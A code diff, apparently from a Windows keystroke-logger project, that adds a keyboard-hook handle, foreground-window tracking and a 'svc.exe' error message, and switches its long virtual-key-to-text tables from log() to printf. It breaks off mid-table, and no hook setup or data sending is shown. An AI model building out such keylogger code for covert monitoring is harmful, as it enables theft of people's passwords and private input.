@@ -1,344 +1,367 @@
-#include "winkey.h"
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <winuser.h>
+#include <tlhelp32.h>
+#include <Strsafe.h>
+#include <stdlib.h>
+#include <locale.h>
+#include <wingdi.h>
+#define REEF(x){ if (x){ free(x); x = NULL;}}
 
-extern BOOL foregroundWindowChanged;
-extern char foregroundWindowTitle[4096];
+HHOOK winHook;
+HWND gh_hwndMain;
+BOOL foregroundWindowChanged;
+char foregroundWindowTitle[4096];
 
-/**
- * This function prints text representation of a virtual key, according to a mode.
- * If the mode is 0, it prints vKey like Ctrl, Alt etc. without printing vKey representation
- * of printable vkey (ie "A", "*" and so on).
- * 
- * If the mode is 1, it also prints the printable characters, normally because a sequence initiated by a [CTRL] vkey
- * or an ALT vkey was began.
- * 
- * Thanks to this, we can log [CTRL]+[S] instead of [CTRL] and nothing, or a strange char code outputed by
- * the infamous UnicodeEx function.
- */
+int PrintError(void)
+{
+    int err = GetLastError();
+    int sz;
+    char buf[512];
+
+    sz = FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        err,
+        0,
+        buf,
+        512,
+        NULL );
+    if (!sz)//the error is not known
+    {
+        printf("Unknown error.\n");
+        return ERROR;
+    }
+    printf("Error svc.exe %d : %hs\n", err, buf);
+    return ERROR;
+}
+
+
 VOID LogvKey(INT vKey, INT MODE)
 {
     if (MODE == 0)
     {
         switch(vKey) {
             case VK_LBUTTON:
-                log("[Left mouse button]", CHAR_MODE, FALSE);
+                printf("[Left mouse button]");
                 break;
             case VK_RBUTTON:
-                log("[Right mouse button]", CHAR_MODE, FALSE);
+                printf("[Right mouse button]");
                 break;
             case VK_CANCEL:
-                log("[Control-break processing]", CHAR_MODE, FALSE);
+                printf("[Control-break processing]");
                 break;
             case VK_MBUTTON:
-                log("[Middle mouse button]", CHAR_MODE, FALSE);
+                printf("[Middle mouse button]");
                 break;
             case VK_XBUTTON1:
-                log("[X1 mouse button]", CHAR_MODE, FALSE);
+                printf("[X1 mouse button]");
                 break;
             case VK_XBUTTON2:
-                log("[X2 mouse button]", CHAR_MODE, FALSE);
+                printf("[X2 mouse button]");
                 break;
             case VK_BACK:
-                log("[Backspace]", CHAR_MODE, FALSE);
+                printf("[Backspace]");
                 break;
             case VK_TAB:
-                log("\\t", CHAR_MODE, FALSE);
+                printf("\\t");
                 break;
             case VK_CLEAR:
-                log("[Clear]", CHAR_MODE, FALSE);
+                printf("[Clear]");
                 break;
             case VK_RETURN:
-                log("\\n", CHAR_MODE, FALSE);
+                printf("\\n");
                 break;
             case VK_SHIFT:
-                log("[Shift]", CHAR_MODE, FALSE);
+                printf("[Shift]");
                 break;
             case VK_CONTROL:
-                log("[Ctrl]", CHAR_MODE, FALSE);
+                printf("[Ctrl]");
                 break;
             case VK_MENU:
-                log("[Alt]", CHAR_MODE, FALSE);
+                printf("[Alt]");
                 break;
             case VK_PAUSE:
-                log("[Pause]", CHAR_MODE, FALSE);
+                printf("[Pause]");
                 break;
             case VK_CAPITAL:
-                log("[Caps lock]", CHAR_MODE, FALSE);
+                printf("[Caps lock]");
                 break;
             case VK_HANGUL:
-                log("[IME Kana/Hangul mode]", CHAR_MODE, FALSE);
+                printf("[IME Kana/Hangul mode]");
                 break;
             case VK_IME_ON:
-                log("[IME On]", CHAR_MODE, FALSE);
+                printf("[IME On]");
                 break;
             case VK_JUNJA:
-                log("[IME Junja mode]", CHAR_MODE, FALSE);
+                printf("[IME Junja mode]");
                 break;
             case VK_FINAL:
-                log("[IME final mode]", CHAR_MODE, FALSE);
+                printf("[IME final mode]");
                 break;
             case VK_KANJI:
-                log("[IME Kanji/Hanja mode]", CHAR_MODE, FALSE);
+                printf("[IME Kanji/Hanja mode]");
                 break;
             case VK_IME_OFF:
-                log("[IME Off]", CHAR_MODE, FALSE);
+                printf("[IME Off]");
                 break;
             case VK_ESCAPE:
-                log("[Esc]", CHAR_MODE, FALSE);
+                printf("[Esc]");
                 break;
             case VK_CONVERT:
-                log("[IME convert]", CHAR_MODE, FALSE);
+                printf("[IME convert]");
                 break;
             case VK_NONCONVERT:
-                log("[IME nonconvert]", CHAR_MODE, FALSE);
+                printf("[IME nonconvert]");
                 break;
             case VK_ACCEPT:
-                log("[IME accept]", CHAR_MODE, FALSE);
+                printf("[IME accept]");
                 break;
             case VK_MODECHANGE:
-                log("[IME mode change request]", CHAR_MODE, FALSE);
+                printf("[IME mode change request]");
                 break;
             case VK_PRIOR:
-                log("[Page up]", CHAR_MODE, FALSE);
+                printf("[Page up]");
                 break;
             case VK_NEXT:
-                log("[Page down]", CHAR_MODE, FALSE);
+                printf("[Page down]");
                 break;
             case VK_END:
-                log("[End]", CHAR_MODE, FALSE);
+                printf("[End]");
                 break;
             case VK_HOME:
-                log("[Home]", CHAR_MODE, FALSE);
+                printf("[Home]");
                 break;
             case VK_LEFT:
-                log("[Left arrow]", CHAR_MODE, FALSE);
+                printf("[Left arrow]");
                 break;
             case VK_UP:
-                log("[Up arrow]", CHAR_MODE, FALSE);
+                printf("[Up arrow]");
                 break;
             case VK_RIGHT:
-                log("[Right arrow]", CHAR_MODE, FALSE);
+                printf("[Right arrow]");
                 break;
             case VK_DOWN:
-                log("[Down arrow]", CHAR_MODE, FALSE);
+                printf("[Down arrow]");
                 break;
             case VK_SELECT:
-                log("[Select]", CHAR_MODE, FALSE);
+                printf("[Select]");
                 break;
             case VK_PRINT:
-                log("[Print]", CHAR_MODE, FALSE);
+                printf("[Print]");
                 break;
             case VK_EXECUTE:
-                log("[Execute]", CHAR_MODE, FALSE);
+                printf("[Execute]");
                 break;
             case VK_SNAPSHOT:
-                log("[Print screen]", CHAR_MODE, FALSE);
+                printf("[Print screen]");
                 break;
             case VK_INSERT:
-                log("[Insert]", CHAR_MODE, FALSE);
+                printf("[Insert]");
                 break;
             case VK_DELETE:
-                log("[Delete]", CHAR_MODE, FALSE);
+                printf("[Delete]");
                 break;
             case VK_HELP:
-                log("[Help]", CHAR_MODE, FALSE);
+                printf("[Help]");
                 break;
             case VK_LWIN:
-                log("[Left Windows logo]", CHAR_MODE, FALSE);
+                printf("[Left Windows logo]");
                 break;
             case VK_RWIN:
-                log("[Right Windows logo]", CHAR_MODE, FALSE);
+                printf("[Right Windows logo]");
                 break;
             case VK_APPS:
-                log("[Application]", CHAR_MODE, FALSE);
+                printf("[Application]");
                 break;
             case VK_SLEEP:
-                log("[Computer Sleep]", CHAR_MODE, FALSE);
+                printf("[Computer Sleep]");
                 break;
             case VK_DIVIDE:
-                log("[Divide]", CHAR_MODE, FALSE);
+                printf("[Divide]");
                 break;
             case VK_F1:
-                log("[F1]", CHAR_MODE, FALSE);
+                printf("[F1]");
                 break;
             case VK_F2:
-                log("[F2]", CHAR_MODE, FALSE);
+                printf("[F2]");
                 break;
             case VK_F3:
-                log("[F3]", CHAR_MODE, FALSE);
+                printf("[F3]");
                 break;
             case VK_F4:
-                log("[F4]", CHAR_MODE, FALSE);
+                printf("[F4]");
                 break;
             case VK_F5:
-                log("[F5]", CHAR_MODE, FALSE);
+                printf("[F5]");
                 break;
             case VK_F6:
-                log("[F6]", CHAR_MODE, FALSE);
+                printf("[F6]");
                 break;
             case VK_F7:
-                log("[F7]", CHAR_MODE, FALSE);
+                printf("[F7]");
                 break;
             case VK_F8:
-                log("[F8]", CHAR_MODE, FALSE);
+                printf("[F8]");
                 break;
             case VK_F9:
-                log("[F9]", CHAR_MODE, FALSE);
+                printf("[F9]");
                 break;
             case VK_F10:
-                log("[F10]", CHAR_MODE, FALSE);
+                printf("[F10]");
                 break;
             case VK_F11:
-                log("[F11]", CHAR_MODE, FALSE);
+                printf("[F11]");
                 break;
             case VK_F12:
-                log("[F12]", CHAR_MODE, FALSE);
+                printf("[F12]");
                 break;
             case VK_F13:
-                log("[F13]", CHAR_MODE, FALSE);
+                printf("[F13]");
                 break;
             case VK_F14:
-                log("[F14]", CHAR_MODE, FALSE);
+                printf("[F14]");
                 break;
             case VK_F15:
-                log("[F15]", CHAR_MODE, FALSE);
+                printf("[F15]");
                 break;
             case VK_F16:
-                log("[F16]", CHAR_MODE, FALSE);
+                printf("[F16]");
                 break;
             case VK_F17:
-                log("[F17]", CHAR_MODE, FALSE);
+                printf("[F17]");
                 break;
             case VK_F18:
-                log("[F18]", CHAR_MODE, FALSE);
+                printf("[F18]");
                 break;
             case VK_F19:
-                log("[F19]", CHAR_MODE, FALSE);
+                printf("[F19]");
                 break;
             case VK_F20:
-                log("[F20]", CHAR_MODE, FALSE);
+                printf("[F20]");
                 break;
             case VK_F21:
-                log("[F21]", CHAR_MODE, FALSE);
+                printf("[F21]");
                 break;
             case VK_F22:
-                log("[F22]", CHAR_MODE, FALSE);
+                printf("[F22]");
                 break;
             case VK_F23:
-                log("[F23]", CHAR_MODE, FALSE);
+                printf("[F23]");
                 break;
             case VK_F24:
-                log("[F24]", CHAR_MODE, FALSE);
+                printf("[F24]");
                 break;
             case VK_NUMLOCK:
-                log("[Num lock]", CHAR_MODE, FALSE);
+                printf("[Num lock]");
                 break;
             case VK_SCROLL:
-                log("[Scroll lock]", CHAR_MODE, FALSE);
+                printf("[Scroll lock]");
                 break;
             case VK_LSHIFT:
-                log("[Left Shift]", CHAR_MODE, FALSE);
+                printf("[Left Shift]");
                 break;
             case VK_RSHIFT:
-                log("[Right Shift]", CHAR_MODE, FALSE);
+                printf("[Right Shift]");
                 break;
             case VK_LCONTROL:
-                log("[Left Ctrl]", CHAR_MODE, FALSE);
+                printf("[Left Ctrl]");
                 break;
             case VK_RCONTROL:
-                log("[Right Ctrl]", CHAR_MODE, FALSE);
+                printf("[Right Ctrl]");
                 break;
             case VK_LMENU:
-                log("[Left Alt]", CHAR_MODE, FALSE);
+                printf("[Left Alt]");
                 break;
             case VK_RMENU:
-                log("[Right Alt]", CHAR_MODE, FALSE);
+                printf("[Right Alt]");
                 break;
             case VK_BROWSER_BACK:
-                log("[Browser Back]", CHAR_MODE, FALSE);
+                printf("[Browser Back]");
                 break;
             case VK_BROWSER_FORWARD:
-                log("[Browser Forward]", CHAR_MODE, FALSE);
+                printf("[Browser Forward]");
                 break;
             case VK_BROWSER_REFRESH:
-                log("[Browser Refresh]", CHAR_MODE, FALSE);
+                printf("[Browser Refresh]");
                 break;
             case VK_BROWSER_STOP:
-                log("[Browser Stop]", CHAR_MODE, FALSE);
+                printf("[Browser Stop]");
                 break;
             case VK_BROWSER_SEARCH:
-                log("[Browser Search]", CHAR_MODE, FALSE);
+                printf("[Browser Search]");
                 break;
             case VK_BROWSER_FAVORITES:
-                log("[Browser Favorites]", CHAR_MODE, FALSE);
+                printf("[Browser Favorites]");
                 break;
             case VK_BROWSER_HOME:
-                log("[Browser Start and Home]", CHAR_MODE, FALSE);
+                printf("[Browser Start and Home]");
                 break;
             case VK_VOLUME_MUTE:
-                log("[Volume Mute]", CHAR_MODE, FALSE);
+                printf("[Volume Mute]");
                 break;
             case VK_VOLUME_DOWN:
-                log("[Volume Down]", CHAR_MODE, FALSE);
+                printf("[Volume Down]");
                 break;
             case VK_VOLUME_UP:
-                log("[Volume Up]", CHAR_MODE, FALSE);
+                printf("[Volume Up]");
                 break;
             case VK_MEDIA_NEXT_TRACK:
-                log("[Next Track]", CHAR_MODE, FALSE);
+                printf("[Next Track]");
                 break;
             case VK_MEDIA_PREV_TRACK:
-                log("[Previous Track]", CHAR_MODE, FALSE);
+                printf("[Previous Track]");
                 break;
             case VK_MEDIA_STOP:
-                log("[Stop Media]", CHAR_MODE, FALSE);
+                printf("[Stop Media]");
                 break;
             case VK_MEDIA_PLAY_PAUSE:
-                log("[Play/Pause Media]", CHAR_MODE, FALSE);
+                printf("[Play/Pause Media]");
                 break;
             case VK_LAUNCH_MAIL:
-                log("[Start Mail]", CHAR_MODE, FALSE);
+                printf("[Start Mail]");
                 break;
             case VK_LAUNCH_MEDIA_SELECT:
-                log("[Select Media]", CHAR_MODE, FALSE);
+                printf("[Select Media]");
                 break;
             case VK_LAUNCH_APP1:
-                log("[Start Application 1]", CHAR_MODE, FALSE);
+                printf("[Start Application 1]");
                 break;
             case VK_LAUNCH_APP2:
-                log("[Start Application 2]", CHAR_MODE, FALSE);
+                printf("[Start Application 2]");
                 break;
             case VK_PROCESSKEY:
-                log("[IME PROCESS]", CHAR_MODE, FALSE);
+                printf("[IME PROCESS]");
                 break;
             case VK_PACKET:
-                log("[Unicode characters]", CHAR_MODE, FALSE);
+                printf("[Unicode characters]");
                 break;
             case VK_ATTN:
-                log("[Attn]", CHAR_MODE, FALSE);
+                printf("[Attn]");
                 break;
             case VK_CRSEL:
-                log("[CrSel]", CHAR_MODE, FALSE);
+                printf("[CrSel]");
                 break;
             case VK_EXSEL:
-                log("[ExSel]", CHAR_MODE, FALSE);
+                printf("[ExSel]");
                 break;
             case VK_EREOF:
-                log("[Erase EOF]", CHAR_MODE, FALSE);
+                printf("[Erase EOF]");
                 break;
             case VK_PLAY:
-                log("[Play]", CHAR_MODE, FALSE);
+                printf("[Play]");
                 break;
             case VK_ZOOM:
-                log("[Zoom]", CHAR_MODE, FALSE);
+                printf("[Zoom]");
                 break;
             case VK_NONAME:
-                log("[Reserved]", CHAR_MODE, FALSE);
+                printf("[Reserved]");
                 break;
             case VK_PA1:
-                log("[PA1]", CHAR_MODE, FALSE);
+                printf("[PA1]");
                 break;
             case VK_OEM_CLEAR:
-                log("[Clear]", CHAR_MODE, FALSE);
+                printf("[Clear]");
                 break;
             default:
                 break;
@@ -348,490 +371,490 @@ VOID LogvKey(INT vKey, INT MODE)
     {
         switch(vKey) {
             case VK_LBUTTON:
-                log("[Left mouse button]", CHAR_MODE, FALSE);
+                printf("[Left mouse button]");
                 break;
             case VK_RBUTTON:
-                log("[Right mouse button]", CHAR_MODE, FALSE);
+                printf("[Right mouse button]");
                 break;
             case VK_CANCEL:
-                log("[Control-break processing]", CHAR_MODE, FALSE);
+                printf("[Control-break processing]");
                 break;
             case VK_MBUTTON:
-                log("[Middle mouse button]", CHAR_MODE, FALSE);
+                printf("[Middle mouse button]");
                 break;
             case VK_XBUTTON1:
-                log("[X1 mouse button]", CHAR_MODE, FALSE);
+                printf("[X1 mouse button]");
                 break;
             case VK_XBUTTON2:
-                log("[X2 mouse button]", CHAR_MODE, FALSE);
+                printf("[X2 mouse button]");
                 break;
             case VK_BACK:
-                log("[Backspace]", CHAR_MODE, FALSE);
+                printf("[Backspace]");
                 break;
             case VK_TAB:
-                log("\\t", CHAR_MODE, FALSE);
+                printf("\\t");
                 break;
             case VK_CLEAR:
-                log("[Clear]", CHAR_MODE, FALSE);
+                printf("[Clear]");
                 break;
             case VK_RETURN:
-                log("\\n", CHAR_MODE, FALSE);
+                printf("\\n");
                 break;
             case VK_SHIFT:
-                log("[Shift]", CHAR_MODE, FALSE);
+                printf("[Shift]");
                 break;
             case VK_CONTROL:
-                log("[Ctrl]", CHAR_MODE, FALSE);
+                printf("[Ctrl]");
                 break;
             case VK_MENU:
-                log("[Alt]", CHAR_MODE, FALSE);
+                printf("[Alt]");
                 break;
             case VK_PAUSE:
-                log("[Pause]", CHAR_MODE, FALSE);
+                printf("[Pause]");
                 break;
             case VK_CAPITAL:
-                log("[Caps lock]", CHAR_MODE, FALSE);
+                printf("[Caps lock]");
                 break;
             case VK_HANGUL:
-                log("[IME Kana/Hangul mode]", CHAR_MODE, FALSE);
+                printf("[IME Kana/Hangul mode]");
                 break;
             case VK_IME_ON:
-                log("[IME On]", CHAR_MODE, FALSE);
+                printf("[IME On]");
                 break;
             case VK_JUNJA:
-                log("[IME Junja mode]", CHAR_MODE, FALSE);
+                printf("[IME Junja mode]");
                 break;
             case VK_FINAL:
-                log("[IME final mode]", CHAR_MODE, FALSE);
+                printf("[IME final mode]");
                 break;
             case VK_KANJI:
-                log("[IME Kanji/Hanja mode]", CHAR_MODE, FALSE);
+                printf("[IME Kanji/Hanja mode]");
                 break;
             case VK_IME_OFF:
-                log("[IME Off]", CHAR_MODE, FALSE);
+                printf("[IME Off]");
                 break;
             case VK_ESCAPE:
-                log("[Esc]", CHAR_MODE, FALSE);
+                printf("[Esc]");
                 break;
             case VK_CONVERT:
-                log("[IME convert]", CHAR_MODE, FALSE);
+                printf("[IME convert]");
                 break;
             case VK_NONCONVERT:
-                log("[IME nonconvert]", CHAR_MODE, FALSE);
+                printf("[IME nonconvert]");
                 break;
             case VK_ACCEPT:
-                log("[IME accept]", CHAR_MODE, FALSE);
+                printf("[IME accept]");
                 break;
             case VK_MODECHANGE:
-                log("[IME mode change request]", CHAR_MODE, FALSE);
+                printf("[IME mode change request]");
                 break;
             case VK_SPACE:
-                log("[Spacebar]", CHAR_MODE, FALSE);
+                printf("[Spacebar]");
                 break;
             case VK_PRIOR:
-                log("[Page up]", CHAR_MODE, FALSE);
+                printf("[Page up]");
                 break;
             case VK_NEXT:
-                log("[Page down]", CHAR_MODE, FALSE);
+                printf("[Page down]");
                 break;
             case VK_END:
-                log("[End]", CHAR_MODE, FALSE);
+                printf("[End]");
                 break;
             case VK_HOME:
-                log("[Home]", CHAR_MODE, FALSE);
+                printf("[Home]");
                 break;
             case VK_LEFT:
-                log("[Left arrow]", CHAR_MODE, FALSE);
+                printf("[Left arrow]");
                 break;
             case VK_UP:
-                log("[Up arrow]", CHAR_MODE, FALSE);
+                printf("[Up arrow]");
                 break;
             case VK_RIGHT:
-                log("[Right arrow]", CHAR_MODE, FALSE);
+                printf("[Right arrow]");
                 break;
             case VK_DOWN:
-                log("[Down arrow]", CHAR_MODE, FALSE);
+                printf("[Down arrow]");
                 break;
             case VK_SELECT:
-                log("[Select]", CHAR_MODE, FALSE);
+                printf("[Select]");
                 break;
             case VK_PRINT:
-                log("[Print]", CHAR_MODE, FALSE);
+                printf("[Print]");
                 break;
             case VK_EXECUTE:
-                log("[Execute]", CHAR_MODE, FALSE);
+                printf("[Execute]");
                 break;
             case VK_SNAPSHOT:
-                log("[Print screen]", CHAR_MODE, FALSE);
+                printf("[Print screen]");
                 break;
             case VK_INSERT:
-                log("[Insert]", CHAR_MODE, FALSE);
+                printf("[Insert]");
                 break;
             case VK_DELETE:
-                log("[Delete]", CHAR_MODE, FALSE);
+                printf("[Delete]");
                 break;
             case VK_HELP:
-                log("[Help]", CHAR_MODE, FALSE);
+                printf("[Help]");
                 break;
             case VK_LWIN:
-                log("[Left Windows logo]", CHAR_MODE, FALSE);
+                printf("[Left Windows logo]");
                 break;
             case VK_RWIN:
-                log("[Right Windows logo]", CHAR_MODE, FALSE);
+                printf("[Right Windows logo]");
                 break;
             case VK_APPS:
-                log("[Application]", CHAR_MODE, FALSE);
+                printf("[Application]");
                 break;
             case VK_SLEEP:
-                log("[Computer Sleep]", CHAR_MODE, FALSE);
+                printf("[Computer Sleep]");
                 break;
                 case 'A':
-                log("[A]", CHAR_MODE, FALSE);
+                printf("[A]");
                 break;
             case 'B':
-                log("[B]", CHAR_MODE, FALSE);
+                printf("[B]");
                 break;
             case 'C':
-                log("[C]", CHAR_MODE, FALSE);
+                printf("[C]");
                 break;
             case 'D':
-                log("[D]", CHAR_MODE, FALSE);
+                printf("[D]");
                 break;
             case 'E':
-                log("[E]", CHAR_MODE, FALSE);
+                printf("[E]");
                 break;
             case 'F':
-                log("[F]", CHAR_MODE, FALSE);
+                printf("[F]");
                 break;
             case 'G':
-                log("[G]", CHAR_MODE, FALSE);
+                printf("[G]");
                 break;
             case 'H':
-                log("[H]", CHAR_MODE, FALSE);
+                printf("[H]");
                 break;
             case 'I':
-                log("[I]", CHAR_MODE, FALSE);
+                printf("[I]");
                 break;
             case 'J':
-                log("[J]", CHAR_MODE, FALSE);
+                printf("[J]");
                 break;
             case 'K':
-                log("[K]", CHAR_MODE, FALSE);
+                printf("[K]");
                 break;
             case 'L':
-                log("[L]", CHAR_MODE, FALSE);
+                printf("[L]");
                 break;
             case 'M':
-                log("[M]", CHAR_MODE, FALSE);
+                printf("[M]");
                 break;
             case 'N':
-                log("[N]", CHAR_MODE, FALSE);
+                printf("[N]");
                 break;
             case 'O':
-                log("[O]", CHAR_MODE, FALSE);
+                printf("[O]");
                 break;
             case 'P':
-                log("[P]", CHAR_MODE, FALSE);
+                printf("[P]");
                 break;
             case 'Q':
-                log("[Q]", CHAR_MODE, FALSE);
+                printf("[Q]");
                 break;
             case 'R':
-                log("[R]", CHAR_MODE, FALSE);
+                printf("[R]");
                 break;
             case 'S':
-                log("[S]", CHAR_MODE, FALSE);
+                printf("[S]");
                 break;
             case 'T':
-                log("[T]", CHAR_MODE, FALSE);
+                printf("[T]");
                 break;
             case 'U':
-                log("[U]", CHAR_MODE, FALSE);
+                printf("[U]");
                 break;
             case 'V':
-                log("[V]", CHAR_MODE, FALSE);
+                printf("[V]");
                 break;
             case 'W':
-                log("[W]", CHAR_MODE, FALSE);
+                printf("[W]");
                 break;
             case 'X':
-                log("[X]", CHAR_MODE, FALSE);
+                printf("[X]");
                 break;
             case 'Y':
-                log("[Y]", CHAR_MODE, FALSE);
+                printf("[Y]");
                 break;
             case 'Z':
-                log("[Z]", CHAR_MODE, FALSE);
+                printf("[Z]");
                 break;
             case VK_NUMPAD0:
-                log("[Numeric keypad 0]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 0]");
                 break;
             case VK_NUMPAD1:
-                log("[Numeric keypad 1]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 1]");
                 break;
             case VK_NUMPAD2:
-                log("[Numeric keypad 2]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 2]");
                 break;
             case VK_NUMPAD3:
-                log("[Numeric keypad 3]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 3]");
                 break;
             case VK_NUMPAD4:
-                log("[Numeric keypad 4]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 4]");
                 break;
             case VK_NUMPAD5:
-                log("[Numeric keypad 5]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 5]");
                 break;
             case VK_NUMPAD6:
-                log("[Numeric keypad 6]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 6]");
                 break;
             case VK_NUMPAD7:
-                log("[Numeric keypad 7]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 7]");
                 break;
             case VK_NUMPAD8:
-                log("[Numeric keypad 8]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 8]");
                 break;
             case VK_NUMPAD9:
-                log("[Numeric keypad 9]", CHAR_MODE, FALSE);
+                printf("[Numeric keypad 9]");
                 break;
             case VK_MULTIPLY:
-                log("[Multiply]", CHAR_MODE, FALSE);
+                printf("[Multiply]");
                 break;
             case VK_ADD:
-                log("[Add]", CHAR_MODE, FALSE);
+                printf("[Add]");
                 break;
             case VK_SEPARATOR:
-                log("[Separator]", CHAR_MODE, FALSE);
+                printf("[Separator]");
                 break;
             case VK_SUBTRACT:
-                log("[Subtract]", CHAR_MODE, FALSE);
+                printf("[Subtract]");
                 break;
             case VK_DECIMAL:
-                log("[Decimal]", CHAR_MODE, FALSE);
+                printf("[Decimal]");
                 break;
             case VK_DIVIDE:
-                log("[Divide]", CHAR_MODE, FALSE);
+                printf("[Divide]");
                 break;
             case VK_F1:
-                log("[F1]", CHAR_MODE, FALSE);
+                printf("[F1]");
                 break;
             case VK_F2:
-                log("[F2]", CHAR_MODE, FALSE);
+                printf("[F2]");
                 break;
             case VK_F3:
-                log("[F3]", CHAR_MODE, FALSE);
+                printf("[F3]");
                 break;
             case VK_F4:
-                log("[F4]", CHAR_MODE, FALSE);
+                printf("[F4]");
                 break;
             case VK_F5:
-                log("[F5]", CHAR_MODE, FALSE);
+                printf("[F5]");
                 break;
             case VK_F6:
-                log("[F6]", CHAR_MODE, FALSE);
+                printf("[F6]");
                 break;
             case VK_F7:
-                log("[F7]", CHAR_MODE, FALSE);
+                printf("[F7]");
                 break;
             case VK_F8:
-                log("[F8]", CHAR_MODE, FALSE);
+                printf("[F8]");
                 break;
             case VK_F9:
-                log("[F9]", CHAR_MODE, FALSE);
+                printf("[F9]");
                 break;
             case VK_F10:
-                log("[F10]", CHAR_MODE, FALSE);
+                printf("[F10]");
                 break;
             case VK_F11:
-                log("[F11]", CHAR_MODE, FALSE);
+                printf("[F11]");
                 break;
             case VK_F12:
-                log("[F12]", CHAR_MODE, FALSE);
+                printf("[F12]");
                 break;
             case VK_F13:
-                log("[F13]", CHAR_MODE, FALSE);
+                printf("[F13]");
                 break;
             case VK_F14:
-                log("[F14]", CHAR_MODE, FALSE);
+                printf("[F14]");
                 break;
             case VK_F15:
-                log("[F15]", CHAR_MODE, FALSE);
+                printf("[F15]");
                 break;
             case VK_F16:
-                log("[F16]", CHAR_MODE, FALSE);
+                printf("[F16]");
                 break;
             case VK_F17:
-                log("[F17]", CHAR_MODE, FALSE);
+                printf("[F17]");
                 break;
             case VK_F18:
-                log("[F18]", CHAR_MODE, FALSE);
+                printf("[F18]");
                 break;
             case VK_F19:
-                log("[F19]", CHAR_MODE, FALSE);
+                printf("[F19]");
                 break;
             case VK_F20:
-                log("[F20]", CHAR_MODE, FALSE);
+                printf("[F20]");
                 break;
             case VK_F21:
-                log("[F21]", CHAR_MODE, FALSE);
+                printf("[F21]");
                 break;
             case VK_F22:
-                log("[F22]", CHAR_MODE, FALSE);
+                printf("[F22]");
                 break;
             case VK_F23:
-                log("[F23]", CHAR_MODE, FALSE);
+                printf("[F23]");
                 break;
             case VK_F24:
-                log("[F24]", CHAR_MODE, FALSE);
+                printf("[F24]");
                 break;
             case VK_NUMLOCK:
-                log("[Num lock]", CHAR_MODE, FALSE);
+                printf("[Num lock]");
                 break;
             case VK_SCROLL:
-                log("[Scroll lock]", CHAR_MODE, FALSE);
+                printf("[Scroll lock]");
                 break;
             case VK_LSHIFT:
-                log("[Left Shift]", CHAR_MODE, FALSE);
+                printf("[Left Shift]");
                 break;
             case VK_RSHIFT:
-                log("[Right Shift]", CHAR_MODE, FALSE);
+                printf("[Right Shift]");
                 break;
             case VK_LCONTROL:
-                log("[Left Ctrl]", CHAR_MODE, FALSE);
+                printf("[Left Ctrl]");
                 break;
             case VK_RCONTROL:
-                log("[Right Ctrl]", CHAR_MODE, FALSE);
+                printf("[Right Ctrl]");
                 break;
             case VK_LMENU:
-                log("[Left Alt]", CHAR_MODE, FALSE);
+                printf("[Left Alt]");
                 break;
             case VK_RMENU:
-                log("[Right Alt]", CHAR_MODE, FALSE);
+                printf("[Right Alt]");
                 break;
             case VK_BROWSER_BACK:
-                log("[Browser Back]", CHAR_MODE, FALSE);
+                printf("[Browser Back]");
                 break;
             case VK_BROWSER_FORWARD:
-                log("[Browser Forward]", CHAR_MODE, FALSE);
+                printf("[Browser Forward]");
                 break;
             case VK_BROWSER_REFRESH:
-                log("[Browser Refresh]", CHAR_MODE, FALSE);
+                printf("[Browser Refresh]");
                 break;
             case VK_BROWSER_STOP:
-                log("[Browser Stop]", CHAR_MODE, FALSE);
+                printf("[Browser Stop]");
                 break;
             case VK_BROWSER_SEARCH:
-                log("[Browser Search]", CHAR_MODE, FALSE);
+                printf("[Browser Search]");
                 break;
             case VK_BROWSER_FAVORITES:
-                log("[Browser Favorites]", CHAR_MODE, FALSE);
+                printf("[Browser Favorites]");
                 break;
             case VK_BROWSER_HOME:
-                log("[Browser Start and Home]", CHAR_MODE, FALSE);
+                printf("[Browser Start and Home]");
                 break;
             case VK_VOLUME_MUTE:
-                log("[Volume Mute]", CHAR_MODE, FALSE);
+                printf("[Volume Mute]");
                 break;
             case VK_VOLUME_DOWN:
-                log("[Volume Down]", CHAR_MODE, FALSE);
+                printf("[Volume Down]");
                 break;
             case VK_VOLUME_UP:
-                log("[Volume Up]", CHAR_MODE, FALSE);
+                printf("[Volume Up]");
                 break;
             case VK_MEDIA_NEXT_TRACK:
-                log("[Next Track]", CHAR_MODE, FALSE);
+                printf("[Next Track]");
                 break;
             case VK_MEDIA_PREV_TRACK:
-                log("[Previous Track]", CHAR_MODE, FALSE);
+                printf("[Previous Track]");
                 break;
             case VK_MEDIA_STOP:
-                log("[Stop Media]", CHAR_MODE, FALSE);
+                printf("[Stop Media]");
                 break;
             case VK_MEDIA_PLAY_PAUSE:
-                log("[Play/Pause Media]", CHAR_MODE, FALSE);
+                printf("[Play/Pause Media]");
                 break;
             case VK_LAUNCH_MAIL:
-                log("[Start Mail]", CHAR_MODE, FALSE);
+                printf("[Start Mail]");
                 break;
             case VK_LAUNCH_MEDIA_SELECT:
-                log("[Select Media]", CHAR_MODE, FALSE);
+                printf("[Select Media]");
                 break;
             case VK_LAUNCH_APP1:
-                log("[Start Application 1]", CHAR_MODE, FALSE);
+                printf("[Start Application 1]");
                 break;
             case VK_LAUNCH_APP2:
-                log("[Start Application 2]", CHAR_MODE, FALSE);
+                printf("[Start Application 2]");
                 break;
             case VK_OEM_1:
-                log("[;:]", CHAR_MODE, FALSE);
+                printf("[;:]");
                 break;
             case VK_OEM_PLUS:
-                log("[+]", CHAR_MODE, FALSE);
+                printf("[+]");
                 break;
             case VK_OEM_COMMA:
-                log("[,]", CHAR_MODE, FALSE);
+                printf("[,]");
                 break;
             case VK_OEM_MINUS:
-                log("[-]", CHAR_MODE, FALSE);
+                printf("[-]");
                 break;
             case VK_OEM_PERIOD:
-                log("[.]", CHAR_MODE, FALSE);
+                printf("[.]");
                 break;
             case VK_OEM_2:
-                log("[/?]", CHAR_MODE, FALSE);
+                printf("[/?]");
                 break;
             case VK_OEM_3:
-                log("[`~]", CHAR_MODE, FALSE);
+                printf("[`~]");
                 break;
             case VK_OEM_4:
-                log("[[{]", CHAR_MODE, FALSE);
+                printf("[[{]");
                 break;
             case VK_OEM_5:
-                log("[\\|]", CHAR_MODE, FALSE);
